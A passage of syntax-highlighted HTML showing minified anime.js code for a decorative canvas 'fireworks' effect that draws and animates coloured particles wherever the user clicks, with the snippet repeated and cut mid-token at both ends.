punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token 